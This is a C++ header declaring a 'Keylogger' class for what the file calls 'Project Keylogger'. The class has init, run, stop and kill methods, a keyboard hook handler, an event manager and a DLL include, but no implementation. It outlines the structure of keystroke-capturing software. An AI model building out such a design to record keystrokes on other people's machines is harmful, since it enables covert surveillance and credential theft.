/**
 * Project Keylogger
 */


#ifndef _KEYLOGGER_H
#define _KEYLOGGER_H

#include "AEvent.h"
#include "EventManager.h"
#include "HookHandler.h"
#include "KeyloggerDLL.h"

class Keylogger {
public: 
	static Keylogger _instance;

public:
    Keylogger();
	~Keylogger();
    bool				init();   
    void				run();
    bool				stop();
    bool				kill();
    Keylogger& getInstance();
    bool pushToQueue(AEvent*);

private: 
    EventManager _eventManager;
    HookHandler _hookHandler;
    std::vector<AEvent*> _events;
};

#endif //_KEYLOGGER_H